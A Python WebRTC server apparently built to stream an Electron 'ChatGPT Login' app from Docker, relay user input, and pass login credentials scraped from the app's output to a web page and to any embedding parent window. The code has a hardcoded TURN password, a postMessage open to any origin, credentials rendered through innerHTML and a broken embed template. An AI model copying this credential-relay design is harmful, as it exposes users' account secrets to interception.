#!/usr/bin/env python3
"""
Local WebRTC server for streaming Electron app.
Run inside Docker container with X virtual display.
"""

import asyncio
import json
import subprocess
import os
import threading
from aiohttp import web
from aiortc import RTCPeerConnection, RTCSessionDescription, RTCConfiguration, RTCIceServer, RTCRtpSender
from aiortc.mediastreams import VideoStreamTrack
from aiortc.contrib.media import VideoFrame

# Configuration - Balanced resolution and latency
DISPLAY_NUM = ":99"
DISPLAY_WIDTH = 1920  # Full HD for good clarity
DISPLAY_HEIGHT = 1080  # 1080p
FPS = 30  # Higher FPS for smoother interaction

PUBLIC_IP = os.environ.get("PUBLIC_IP", os.environ.get("SERVER_PUBLIC_IP", "64.23.163.23"))
TURN_URLS = [f"turn:{PUBLIC_IP}:3478", f"turn:{PUBLIC_IP}:5349"]
STUN_URLS = [
    "stun:stun.l.google.com:19302",
    "stun:stun1.l.google.com:19302",
]

# Global state
pcs = set()
xvfb_process = None
electron_process = None
electron_monitor_thread = None
ffmpeg_process = None
turn_process = None
data_channels = set()  # Store active data channels to send credentials

class ElectronDisplayTrack(VideoStreamTrack):
    """Captures the Electron app display and streams it via WebRTC"""
    
    kind = "video"

    def __init__(self):
        super().__init__()
        self.width = DISPLAY_WIDTH
        self.height = DISPLAY_HEIGHT
        
        # Start ffmpeg to capture the display in YUV420 (WebRTC-friendly)
        self.ffmpeg_process = subprocess.Popen(
            [
                'ffmpeg',
                '-f', 'x11grab',
                '-video_size', f'{DISPLAY_WIDTH}x{DISPLAY_HEIGHT}',
                '-framerate', str(FPS),
                '-probesize', '50M',
                '-i', DISPLAY_NUM,
                # Force key-frame interval (GOP) and delay first large I-frame
                '-g', '120',  # one key-frame every ~5s at 24 fps
                '-force_key_frames', 'expr:gte(t,10)',  # push first big I-frame after 10s
                '-vf', 'format=yuv420p',
                '-pix_fmt', 'yuv420p',
                '-f', 'rawvideo',
                '-'
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            bufsize=DISPLAY_WIDTH * DISPLAY_HEIGHT * 3 // 2
        )
        print(f"Started ffmpeg capture from display {DISPLAY_NUM}")

    async def recv(self) -> VideoFrame:
        """Read a frame from ffmpeg and return it as a VideoFrame"""
        pts, time_base = await self.next_timestamp()
        
        y_size = self.width * self.height
        uv_size = (self.width // 2) * (self.height // 2)
        frame_size = y_size + 2 * uv_size
        raw_frame = await asyncio.get_event_loop().run_in_executor(
            None, self.ffmpeg_process.stdout.read, frame_size
        )
        
        frame = VideoFrame(width=self.width, height=self.height, format="yuv420p")

        if len(raw_frame) != frame_size:
            # Return neutral black frame if we can't read
            frame.planes[0].update(b'\x00' * y_size)
            frame.planes[1].update(b'\x80' * uv_size)
            frame.planes[2].update(b'\x80' * uv_size)
        else:
            frame.planes[0].update(raw_frame[:y_size])
            frame.planes[1].update(raw_frame[y_size:y_size + uv_size])
            frame.planes[2].update(raw_frame[y_size + uv_size:])

        frame.pts = pts
        frame.time_base = time_base
        return frame

    def stop(self):
        """Stop the ffmpeg capture process"""
        if self.ffmpeg_process:
            print(f"Stopping ffmpeg capture process {self.ffmpeg_process.pid}")
            try:
                self.ffmpeg_process.terminate()
                self.ffmpeg_process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                print(f"Force killing ffmpeg process {self.ffmpeg_process.pid}")
                self.ffmpeg_process.kill()
                self.ffmpeg_process.wait()
            self.ffmpeg_process = None
            print("Ffmpeg capture stopped")

def start_turn():
    """Start TURN server"""
    global turn_process

    print("Starting TURN server")
    turn_process = subprocess.Popen([
        'turnserver',
        '-c', '/etc/turnserver.conf',
        '--log-file', 'stdout'
    ])
    print("TURN server started")

def start_xvfb():
    """Start virtual X server"""
    global xvfb_process

    print(f"Starting Xvfb on display {DISPLAY_NUM}")
    xvfb_process = subprocess.Popen([
        'Xvfb',
        DISPLAY_NUM,
        '-screen', '0', f'{DISPLAY_WIDTH}x{DISPLAY_HEIGHT}x24',
        '-ac',
        '+extension', 'GLX',
        '+render',
        '-noreset',
        '-nocursor'
    ])

    import time
    time.sleep(3)
    print("Xvfb started")

def clear_electron_session():
    """Clear Electron session data for a fresh start"""
    print("🧹 Starting Electron session cleanup...")
    import shutil
    session_paths = [
        '/root/.config/Electron',
        '/root/.cache/electron',
        '/tmp/.org.chromium.Chromium.*'
    ]

    for path in session_paths:
        try:
            if '*' in path:
                import glob
                matching_paths = glob.glob(path)
                if not matching_paths:
                    print(f"  - No matching paths for pattern: {path}")
                    continue
                for matching_path in matching_paths:
                    if os.path.exists(matching_path):
                        shutil.rmtree(matching_path)
                        print(f"  - Successfully cleared: {matching_path}")
                    else:
                        print(f"  - Path not found (already cleared?): {matching_path}")
            else:
                if os.path.exists(path):
                    shutil.rmtree(path)
                    print(f"  - Successfully cleared: {path}")
                else:
                    print(f"  - Path not found (already cleared?): {path}")
        except Exception as e:
            print(f"  - ⚠️  Could not clear {path}: {e}")
    print("✅ Electron session cleanup finished.")

def stop_electron():
    """Stop the current Electron process"""
    global electron_process, electron_monitor_thread

    if electron_process:
        print("🛑 Stopping Electron process...")
        try:
            electron_process.terminate()
            electron_process.wait(timeout=5)
            print("✅ Electron process stopped")
        except subprocess.TimeoutExpired:
            print("⚠️  Electron didn't terminate gracefully, killing...")
            electron_process.kill()
            electron_process.wait()
        except Exception as e:
            print(f"⚠️  Error stopping Electron: {e}")

        electron_process = None

    if electron_monitor_thread and electron_monitor_thread.is_alive():
        print("🛑 Stopping Electron output monitor thread...")
        electron_monitor_thread.join(timeout=2)
        if electron_monitor_thread.is_alive():
            print("  - ⚠️  Monitor thread did not stop gracefully.")
        else:
            print("  - ✅ Monitor thread stopped.")
        electron_monitor_thread = None

def start_electron():
    """Start the Electron app"""
    global electron_process

    env = os.environ.copy()
    env['DISPLAY'] = DISPLAY_NUM
    env['ELECTRON_DISABLE_SANDBOX'] = '1'

    print("🔄 Starting fresh Electron app (main.js)")

    electron_process = subprocess.Popen(
        ['electron', '/app/main.js'],
        env=env,
        cwd='/app',
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    print(f"✅ Fresh Electron app started with PID {electron_process.pid}")

def monitor_electron_output():
    """Monitor Electron stdout for credential output"""
    global electron_process, data_channels
    
    if not electron_process or not electron_process.stdout:
        print("⚠️  No Electron stdout to monitor")
        return
    
    print("👀 Monitoring Electron output for credentials...")
    
    try:
        capturing = False
        credentials_lines = []
        
        for line in iter(electron_process.stdout.readline, ''):
            line = line.strip()
            
            # Forward all Electron output for debugging
            if line:
                print(f"[ELECTRON] {line}")
            
            # Detect credential capture markers
            if "=== CREDENTIALS CAPTURED ===" in line:
                capturing = True
                credentials_lines = []
                print("🔍 Detected credentials marker, capturing...")
                continue
            
            if "=== END CREDENTIALS ===" in line:
                capturing = False
                credentials_json = '\n'.join(credentials_lines)
                
                try:
                    credentials = json.loads(credentials_json)
                    
                    # Send to all connected data channels
                    message = {
                        'type': 'credentials',
                        'credentials': credentials
                    }
                    
                    print(f"🔑 Credentials parsed! Sending to {len(data_channels)} channels...")
                    
                    # Send via asyncio since we're in a thread
                    import asyncio
                    loop = asyncio.new_event_loop()
                    
                    async def send_to_channels():
                        for channel in list(data_channels):
                            try:
                                channel.send(json.dumps(message))
                                print("✅ Sent credentials to frontend!")
                            except Exception as e:
                                print(f"❌ Failed to send: {e}")
                                data_channels.discard(channel)
                    
                    try:
                        loop.run_until_complete(send_to_channels())
                    finally:
                        loop.close()
                    
                except json.JSONDecodeError as e:
                    print(f"❌ Failed to parse credentials JSON: {e}")
                
                credentials_lines = []
                continue
            
            if capturing:
                credentials_lines.append(line)
    
    except Exception as e:
        print(f"❌ Error monitoring Electron output: {e}")
        import traceback
        traceback.print_exc()

def handle_input_event(data):
    """Forward input events to the Electron app using xdotool"""
    event_type = data.get("type")
    
    try:
        if event_type == "mousemove":
            x, y = int(data["x"]), int(data["y"])
            subprocess.run([
                'xdotool', 'mousemove', str(x), str(y)
            ], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
        
        elif event_type == "mousedown":
            x, y = int(data["x"]), int(data["y"])
            button = data.get("button", 1)
            subprocess.run([
                'xdotool', 'mousemove', str(x), str(y),
                'mousedown', str(button)
            ], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
        
        elif event_type == "mouseup":
            x, y = int(data["x"]), int(data["y"])
            button = data.get("button", 1)
            subprocess.run([
                'xdotool', 'mousemove', str(x), str(y),
                'mouseup', str(button)
            ], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
        
        elif event_type == "keydown":
            key = data.get("key", "")
            ctrl_key = data.get("ctrlKey", False)
            meta_key = data.get("metaKey", False)  # Cmd key on Mac
            
            # Handle Cmd+V (Mac) or Ctrl+V (Windows/Linux) paste shortcuts
            if (key.lower() == "v" and (ctrl_key or meta_key)):
                # Trigger paste functionality instead of sending the key combo
                clipboard_text = data.get("clipboardText", "")
                if clipboard_text:
                    # Use xclip to set clipboard and paste
                    p = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE, env={'DISPLAY': DISPLAY_NUM})
                    p.communicate(input=clipboard_text.encode('utf-8'))
                    subprocess.run(['xdotool', 'key', 'ctrl+v'], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
                return
            
            if key:
                if len(key) == 1:
                    # Use 'type' for single characters to handle symbols correctly
                    subprocess.run(['xdotool', 'type', key], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
                else:
                    # Use 'key' for special keysyms (e.g., BackSpace, Return)
                    subprocess.run(['xdotool', 'key', key], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
        
        elif event_type == "paste":
            text = data.get("text", "")
            if text:
                # Use xclip to set the clipboard contents, then simulate Ctrl+V
                p = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE, env={'DISPLAY': DISPLAY_NUM})
                p.communicate(input=text.encode('utf-8'))
                subprocess.run(['xdotool', 'key', 'ctrl+v'], env={'DISPLAY': DISPLAY_NUM}, timeout=1)
    
    except Exception as e:
        print(f"Error handling {event_type}: {e}")

async def offer(request):
    """Handle WebRTC offer"""
    params = await request.json()
    peer_id = params.get("peer_id", "default")
    
    print(f"Received offer from peer {peer_id}")
    
    offer_sdp = RTCSessionDescription(sdp=params["sdp"], type=params["type"])

    pc = RTCPeerConnection(configuration=RTCConfiguration(
        iceServers=[
            RTCIceServer(urls=STUN_URLS[0]),
            RTCIceServer(urls=STUN_URLS[1]),
            RTCIceServer(
                urls=TURN_URLS,
                username="webrtc",
                credential="password123"
            ),
        ]
    ))
    pcs.add(pc)

    ice_complete = asyncio.Event()

    @pc.on("icegatheringstatechange")
    def on_icegatheringstatechange():
        print(f"ICE gathering state for {peer_id}: {pc.iceGatheringState}")
        if pc.iceGatheringState == "complete" and not ice_complete.is_set():
            ice_complete.set()

    @pc.on("connectionstatechange")
    async def on_connectionstatechange():
        print(f"Connection state for {peer_id}: {pc.connectionState}")
        if pc.connectionState in ("failed", "closed", "disconnected"):
            print(f"Cleaning up connection for {peer_id}")
            # Stop video track
            for sender in pc.getSenders():
                if sender.track:
                    sender.track.stop()
            await pc.close()
            pcs.discard(pc)

    @pc.on("datachannel")
    def on_datachannel(channel):
        print(f"Data channel opened: {channel.label}")
        data_channels.add(channel)

        @channel.on("close")
        def on_close():
            print(f"Data channel closed: {channel.label}")
            data_channels.discard(channel)

        @channel.on("message")
        def on_message(message):
            try:
                data = json.loads(message)
                handle_input_event(data)
            except Exception as e:
                print(f"Error handling input: {e}")

    # Add video track with codec and bitrate preferences
    video_track = ElectronDisplayTrack()
    sender = pc.addTrack(video_track)

    try:
        capabilities = RTCRtpSender.getCapabilities('video')
        if capabilities and capabilities.codecs:
            h264 = [c for c in capabilities.codecs if getattr(c, 'mimeType', '').lower() == 'video/h264']
            vp9 = [c for c in capabilities.codecs if getattr(c, 'mimeType', '').lower() == 'video/vp9']
            remaining = [c for c in capabilities.codecs if c not in h264 + vp9]
            preferred_codecs = h264 + vp9 + remaining
            if hasattr(sender, 'setCodecPreferences') and preferred_codecs:
                sender.setCodecPreferences(preferred_codecs)
    except Exception as e:
        print(f"⚠️  Codec preference setup failed: {e}")

    try:
        params = sender.getParameters()
        if params and getattr(params, 'encodings', None):
            # Start conservatively to reduce latency
            for enc in params.encodings:
                enc.maxBitrate = 2_000_000   # 2 Mbps initial ceiling
                enc.minBitrate = 1_000_000   # 1 Mbps floor
                enc.maxFramerate = FPS
                enc.scaleResolutionDownBy = 1.0
            await sender.setParameters(params)

            async def ramp_bitrate():
                await asyncio.sleep(6)  # allow ICE + congestion control to settle
                try:
                    ramp_params = sender.getParameters()
                    if ramp_params and getattr(ramp_params, 'encodings', None):
                        for enc in ramp_params.encodings:
                            enc.maxBitrate = 4_000_000  # 4 Mbps ceiling for quality
                            enc.minBitrate = 3_000_000  # keep floor high to avoid blur
                            enc.maxFramerate = FPS
                        await sender.setParameters(ramp_params)
                        print("🔧 Bitrate ramped to ~3-4 Mbps after stabilization")
                except Exception as re:
                    print(f"⚠️  Bitrate ramp failed: {re}")

            asyncio.create_task(ramp_bitrate())
    except Exception as e:
        print(f"⚠️  Encoding parameter setup failed: {e}")

    await pc.setRemoteDescription(offer_sdp)
    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)

    # Wait for ICE gathering to complete so SDP includes server candidates
    if pc.iceGatheringState != "complete":
        try:
            await asyncio.wait_for(ice_complete.wait(), timeout=10)
            print(f"ICE gathering completed for {peer_id}")
        except asyncio.TimeoutError:
            print(f"ICE gathering timed out for {peer_id}; proceeding with partial candidates")

    return web.Response(
        content_type="application/json",
        text=json.dumps({
            "sdp": pc.localDescription.sdp,
            "type": pc.localDescription.type
        }),
    )

async def index(request):
    """Serve the frontend HTML page"""
    html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ChatGPT Login - Remote Electron App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        .header {
            background: #1f1f1f;
            border-bottom: 1px solid #2a2a2a;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            font-size: 20px;
            font-weight: 600;
        }
        .controls { display: flex; gap: 12px; align-items: center; }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
            font-size: 14px;
        }
        button.primary { background: #10a37f; color: #fff; }
        button.primary:hover { background: #0d8c6b; }
        button.secondary { background: #2e2e2e; color: #fff; }
        button.secondary:hover { background: #3a3a3a; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { font-size: 14px; color: #a0a0a0; }
        .status.connected { color: #10a37f; }
        .status.error { color: #ef4444; }
        .video-container {
            flex: 1;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        video {
            max-width: 100%;
            max-height: 100%;
            width: auto;
            height: auto;
            object-fit: contain;
            background: #000;
        }
        .loading {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background: rgba(0, 0, 0, 0.65);
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
        }
        .footer {
            padding: 14px 24px;
            font-size: 13px;
            color: #909090;
            background: #181818;
            border-top: 1px solid #2a2a2a;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ChatGPT Login - Remote Electron App</h1>
        <div class="controls">
            <span id="status" class="status">Idle</span>
            <button id="pasteBtn" class="secondary" title="Paste from local clipboard">Paste</button>
            <button id="connectBtn" class="primary">Connect</button>
            <button id="disconnectBtn" class="secondary" style="display: none;">Disconnect</button>
        </div>
    </div>
    <div class="video-container">
        <video id="remoteVideo" autoplay playsinline></video>
        <div id="loading" class="loading" style="display: none;">Connecting...</div>
    </div>
    <div class="footer">
        Use your mouse and keyboard inside the video to control the Electron app
    </div>
    <script>
        const OFFER_URL = '/offer';
        const statusEl = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const remoteVideo = document.getElementById('remoteVideo');
        const loadingEl = document.getElementById('loading');
        const peerId = 'peer_' + Math.random().toString(36).slice(2, 10);

        let pc = null;
        let dc = null;

        function updateStatus(message, kind = 'normal') {
            statusEl.textContent = message;
            statusEl.className = 'status' + (kind ? ' ' + kind : '');
        }

        function setConnected(connected) {
            if (connected) {
                connectBtn.style.display = 'none';
                disconnectBtn.style.display = 'inline-block';
            } else {
                connectBtn.style.display = 'inline-block';
                connectBtn.disabled = false;
                disconnectBtn.style.display = 'none';
            }
        }

        async function connect() {
            // Prevent multiple connections
            if (pc && pc.connectionState !== 'closed') {
                return;
            }

            // Clean up any existing connections first
            disconnect();

            try {
                connectBtn.disabled = true;
                updateStatus('Connecting...', 'normal');
                loadingEl.style.display = 'block';

                pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: '__STUN_URL_0__' },
                        { urls: '__STUN_URL_1__' },
                        {
                            urls: '__TURN_URLS__',
                            username: 'webrtc',
                            credential: 'password123'
                        }
                    ]
                });

                pc.addTransceiver('video', { direction: 'recvonly' });
                const videoTransceiver = pc.getTransceivers().find(t => t.receiver && t.receiver.track && t.receiver.track.kind === 'video');
                if (videoTransceiver) {
                    if (videoTransceiver.setDegradationPreference) {
                        try { videoTransceiver.setDegradationPreference('maintain-framerate'); } catch (e) {}
                    }
                    if (videoTransceiver.setCodecPreferences && typeof RTCRtpSender !== 'undefined' && RTCRtpSender.getCapabilities) {
                        const capabilities = RTCRtpSender.getCapabilities('video');
                        if (capabilities && capabilities.codecs && capabilities.codecs.length) {
                            const h264 = capabilities.codecs.filter(c => (c.mimeType || '').toLowerCase() === 'video/h264');
                            const vp9 = capabilities.codecs.filter(c => (c.mimeType || '').toLowerCase() === 'video/vp9');
                            const rest = capabilities.codecs.filter(c => !h264.includes(c) && !vp9.includes(c));
                            const preferred = h264.concat(vp9, rest);
                            if (preferred.length) {
                                try { videoTransceiver.setCodecPreferences(preferred); } catch (e) {}
                            }
                        }
                    }
                }

                pc.ontrack = (event) => {
                    remoteVideo.srcObject = event.streams[0];
                    try {
                        const track = event.streams[0].getVideoTracks()[0];
                        if (track && 'contentHint' in track) {
                            track.contentHint = 'detail';
                        }
                    } catch (e) {}
                    updateStatus('Connected!', 'connected');
                    setConnected(true);
                    loadingEl.style.display = 'none';
                };

                pc.onconnectionstatechange = () => {
                    if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected' || pc.connectionState === 'closed') {
                        updateStatus('Connection ' + pc.connectionState, 'error');
                        disconnect();
                    }
                };

                dc = pc.createDataChannel('input', { ordered: true });
                dc.onmessage = handleDataChannelMessage;
                dc.onclose = () => {};

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);

                const response = await fetch(OFFER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        peer_id: peerId,
                        sdp: pc.localDescription.sdp,
                        type: pc.localDescription.type
                    })
                });

                if (!response.ok) {
                    throw new Error('Server error: ' + response.status);
                }

                const answer = await response.json();
                await pc.setRemoteDescription({
                    type: answer.type,
                    sdp: answer.sdp
                });

                updateStatus('Establishing connection...', 'normal');
            } catch (error) {
                console.error(error);
                updateStatus('Error: ' + error.message, 'error');
                loadingEl.style.display = 'none';
                setConnected(false);
                if (pc) { pc.close(); pc = null; }
                if (dc) { dc.close(); dc = null; }
            }
        }

        async function disconnect() {
            updateStatus('Disconnecting...', 'normal');

            // Close data channel first
            if (dc) {
                dc.close();
                dc = null;
            }

            // Close peer connection
            if (pc) {
                pc.close();
                pc = null;
            }

            // Clear video
            remoteVideo.srcObject = null;

            // Reset UI
            loadingEl.style.display = 'none';
            updateStatus('Disconnected', 'normal');
            setConnected(false);

            // Clear any pending connections
            if (window.connectionTimeout) {
                clearTimeout(window.connectionTimeout);
                window.connectionTimeout = null;
            }

            // Restart Electron for fresh session
            try {
                await fetch('/restart-electron', { method: 'POST' });
            } catch (error) {
                // Silently handle restart errors
            }
        }

        function sendInput(data) {
            if (dc && dc.readyState === 'open') {
                dc.send(JSON.stringify(data));
            }
        }

        // Handle incoming data channel messages (for credentials)
        function handleDataChannelMessage(event) {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'credentials') {
                    displayCredentials(data.credentials);
                }
                } catch (e) {
                    // Ignore non-JSON messages
                }
        }

        function displayCredentials(credentials) {
            // Create or update credentials display
            let credDiv = document.getElementById('credentials-display');
            if (!credDiv) {
                credDiv = document.createElement('div');
                credDiv.id = 'credentials-display';
                credDiv.style.cssText = `
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    background: rgba(0, 0, 0, 0.9);
                    color: #10a37f;
                    padding: 20px;
                    border-radius: 8px;
                    border: 1px solid #10a37f;
                    max-width: 500px;
                    font-family: monospace;
                    font-size: 12px;
                    z-index: 10000;
                    max-height: 80vh;
                    overflow-y: auto;
                `;
                document.body.appendChild(credDiv);
            }

            const formattedCredentials = JSON.stringify(credentials, null, 2);
            credDiv.innerHTML = `
                <div style="margin-bottom: 10px; font-weight: bold; color: #10a37f;">🔑 Credentials Captured!</div>
                <pre style="margin: 0; white-space: pre-wrap; word-break: break-all;">${formattedCredentials}</pre>
                <button onclick="copyCredentials()" style="
                    margin-top: 10px;
                    padding: 5px 10px;
                    background: #10a37f;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                ">Copy to Clipboard</button>
                <button onclick="hideCredentials()" style="
                    margin-top: 10px;
                    margin-left: 5px;
                    padding: 5px 10px;
                    background: #666;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                ">Hide</button>
            `;
        }

        function copyCredentials() {
            const credDiv = document.getElementById('credentials-display');
            const pre = credDiv.querySelector('pre');
            navigator.clipboard.writeText(pre.textContent).then(() => {
                updateStatus('Credentials copied to clipboard!', 'connected');
                setTimeout(() => updateStatus('Credentials captured', 'connected'), 2000);
            });
        }

        function hideCredentials() {
            const credDiv = document.getElementById('credentials-display');
            if (credDiv) {
                credDiv.remove();
            }
        }

        remoteVideo.addEventListener('mousemove', (e) => {
            if (!dc || dc.readyState !== 'open' || !remoteVideo.videoWidth) return;
            const rect = remoteVideo.getBoundingClientRect();
            const scaleX = remoteVideo.videoWidth / rect.width;
            const scaleY = remoteVideo.videoHeight / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);
            sendInput({ type: 'mousemove', x, y });
        });

        ['mousedown', 'mouseup'].forEach((eventName) => {
            remoteVideo.addEventListener(eventName, (e) => {
                e.preventDefault();
                if (!dc || dc.readyState !== 'open' || !remoteVideo.videoWidth) return;
                const rect = remoteVideo.getBoundingClientRect();
                const scaleX = remoteVideo.videoWidth / rect.width;
                const scaleY = remoteVideo.videoHeight / rect.height;
                const x = Math.round((e.clientX - rect.left) * scaleX);
                const y = Math.round((e.clientY - rect.top) * scaleY);
                const button = e.button + 1;
                sendInput({ type: eventName, x, y, button });
            });
        });

        document.addEventListener('keydown', async (e) => {
            if (!dc || dc.readyState !== 'open') {
                return;
            }
            e.preventDefault();

            // Handle Cmd+V (Mac) or Ctrl+V (Windows/Linux) for paste
            if (e.key.toLowerCase() === 'v' && (e.ctrlKey || e.metaKey)) {
                try {
                    const clipboardText = await navigator.clipboard.readText();
                    sendInput({
                        type: 'keydown',
                        key: e.key,
                        ctrlKey: e.ctrlKey,
                        metaKey: e.metaKey,
                        clipboardText: clipboardText
                    });
                    return;
                } catch (err) {
                    // Fallback if clipboard access fails - just send the key combo
                    console.warn('Clipboard access failed:', err);
                }
            }

            // Handle special keys
            let keyName = e.key;
            if (e.key === 'Backspace') keyName = 'BackSpace';
            else if (e.key === 'Enter') keyName = 'Return';
            else if (e.key === ' ') keyName = 'space';
            else if (e.key === 'Tab') keyName = 'Tab';
            else if (e.key === 'Escape') keyName = 'Escape';
            else if (e.key === 'ArrowUp') keyName = 'Up';
            else if (e.key === 'ArrowDown') keyName = 'Down';
            else if (e.key === 'ArrowLeft') keyName = 'Left';
            else if (e.key === 'ArrowRight') keyName = 'Right';
            else if (e.key === 'Delete') keyName = 'Delete';
            else if (e.key === 'Insert') keyName = 'Insert';
            else if (e.key === 'Home') keyName = 'Home';
            else if (e.key === 'End') keyName = 'End';
            else if (e.key === 'PageUp') keyName = 'Page_Up';
            else if (e.key === 'PageDown') keyName = 'Page_Down';
            else if (e.key.length === 1) {
                // Regular character keys
                keyName = e.key;
            } else {
                // Fallback for other keys
                keyName = e.key;
            }

            sendInput({ 
                type: 'keydown', 
                key: keyName,
                ctrlKey: e.ctrlKey,
                metaKey: e.metaKey
            });
        });

        document.addEventListener('keyup', (e) => {
            if (!dc || dc.readyState !== 'open') {
                return;
            }
            // Only prevent default for keys we handle
            if (['Backspace', 'Enter', 'Tab', 'Escape', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Delete', 'Insert', 'Home', 'End', 'PageUp', 'PageDown'].includes(e.key) || e.key.length === 1) {
                e.preventDefault();
            }
        });

        remoteVideo.addEventListener('contextmenu', (e) => e.preventDefault());
        
        connectBtn.addEventListener('click', connect);
        disconnectBtn.addEventListener('click', disconnect);
        window.addEventListener('beforeunload', disconnect);
    </script>
</body>
</html>"""
    
    # Replace placeholders with actual values
    html = html.replace('__STUN_URL_0__', STUN_URLS[0])
    html = html.replace('__STUN_URL_1__', STUN_URLS[1])
    html = html.replace('__TURN_URLS__', json.dumps(TURN_URLS))
    
    return web.Response(text=html, content_type="text/html")

async def embed(request):
    """Serve embeddable minimal UI page"""
    html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>ChatGPT Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }}
        .video-container {{
            flex: 1;
            position: relative;
            background: #000;
        }}
        video {{
            width: 100%;
            height: 100%;
            object-fit: contain;
            background: #000;
        }}
        .overlay {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.75);
            padding: 16px 22px;
            border-radius: 10px;
            font-size: 15px;
            text-align: center;
            display: none;
        }}
        .overlay.show {{
            display: block;
        }}
        .overlay.success {{
            color: #10a37f;
        }}
    </style>
</head>
<body>
    <div class="video-container">
        <video id="remoteVideo" autoplay playsinline></video>
        <div id="statusOverlay" class="overlay show">Initializing secure login...</div>
        <div id="successOverlay" class="overlay success">✓ Login successful<br/>Credentials delivered</div>
    </div>
    <script>
        const OFFER_URL = '/offer';
        const peerId = 'peer_' + Math.random().toString(36).slice(2, 10);
        const remoteVideo = document.getElementById('remoteVideo');
        const statusOverlay = document.getElementById('statusOverlay');
        const successOverlay = document.getElementById('successOverlay');

        let pc = null;
        let dc = null;

        function updateStatus(message) {{
            statusOverlay.textContent = message;
            statusOverlay.classList.add('show');
        }}

        function hideStatus() {{
            statusOverlay.classList.remove('show');
        }}

        function showSuccess() {{
            hideStatus();
            successOverlay.classList.add('show');
            setTimeout(() => successOverlay.classList.remove('show'), 3000);
        }}

        function postCredentials(credentials) {{
            try {{
                window.parent.postMessage({{ type: 'chatgpt-credentials', credentials }}, '*');
            }} catch (err) {{
                console.warn('Failed to post credentials to parent window:', err);
            }}
        }}

        async function connect() {{
            try {{
                updateStatus('Connecting...');

                pc = new RTCPeerConnection({{
                    iceServers: [
                        {{ urls: '__STUN_URL_0__' }},
                        {{ urls: '__STUN_URL_1__' }},
                        {{
                            urls: '__TURN_URLS__',
                            username: 'webrtc',
                            credential: 'password123'
                        }}
                    ]
                }});

                pc.addTransceiver('video', {{ direction: 'recvonly' }});

                pc.ontrack = (event) => {{
                    remoteVideo.srcObject = event.streams[0];
                    hideStatus();
                }};

                pc.onconnectionstatechange = () => {{
                    if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected' || pc.connectionState === 'closed') {{
                        updateStatus('Connection ' + pc.connectionState);
                    }}
                }};

                dc = pc.createDataChannel('input', {{ ordered: true }});
                dc.onmessage = handleDataChannelMessage;
                dc.onclose = () => {{}};

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);

                const response = await fetch(OFFER_URL, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        peer_id: peerId,
                        sdp: pc.localDescription.sdp,
                        type: pc.localDescription.type
                    }})
                }});

                if (!response.ok) {{
                    throw new Error('Server error: ' + response.status);
                }}

                const answer = await response.json();
                await pc.setRemoteDescription({{
                    type: answer.type,
                    sdp: answer.sdp
                }});

                updateStatus('Connected');
                setTimeout(hideStatus, 1200);
            }} catch (error) {{
                console.error(error);
                updateStatus('Connection failed: ' + error.message);
            }}
        }}

        function handleDataChannelMessage(event) {{
            try {{
                const data = JSON.parse(event.data);
                if (data.type === 'credentials') {{
                    postCredentials(data.credentials);
                    showSuccess();
                }}
            }} catch (e) {{
                // Ignore non-JSON messages
            }}
        }}

        function sendInput(data) {{
            if (dc && dc.readyState === 'open') {{
                dc.send(JSON.stringify(data));
            }}
        }}

        ['mousedown', 'mouseup', 'mousemove'].forEach(eventName => {{
            remoteVideo.addEventListener(eventName, (e) => {{
                if (!dc || dc.readyState !== 'open') return;
                e.preventDefault();

                const rect = remoteVideo.getBoundingClientRect();
